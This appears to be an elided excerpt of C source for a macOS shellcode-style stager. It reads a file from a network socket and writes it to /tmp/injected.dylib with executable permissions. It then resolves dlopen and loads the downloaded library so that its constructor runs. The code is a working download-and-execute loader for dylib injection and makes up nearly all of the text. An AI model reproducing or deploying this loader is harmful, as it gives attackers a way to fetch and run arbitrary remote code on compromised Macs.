...
static int receivefile(int socket, int fd);
...
int main() {
	...
	const char* destFile = "/tmp/injected.dylib";
	int fd = scc_open(destFile, O_RDWR | O_CREAT | O_TRUNC, 0755);
	if(fd < 0) {
		// on error, bail.
		scc_exit(50);
	}
	...
	int fileSize = receivefile(sockfd, fd);
	if(fileSize < 0) {
		// On error, clean up and bail.
		scc_exit(46);
	}

	// close the destination file, it will contain the dylib for injection.
	scc_close(fd);
	...
	//  up on it. However for now, we start with the easier disk version.

	// first, we open the dynamic loader and map it into memory. We will use it to determine
	//  target specific locations of useful procedures. We are assuming that the target program
	...
	dlopen_t dlopen = (dlopen_t)dlsym(RTLD_DEFAULT, "dlopen");
	if(dlopen == NULL) {
		scc_exit(49);
	}

	// load our remote dylib, at this point the constructor should've run as well.
	void* image = dlopen(destFile, RTLD_LAZY);
...
static int receivefile(int socket, int fd) {
	...
	// Nothing fancy, iterate until the file is done downloaded.
	int rd = 0;
	while((rd = scc_read(socket, buffer, 4096)) > 0) {
		actualSize += rd;

		// write out the file.
		scc_write(fd, buffer, rd);
	}
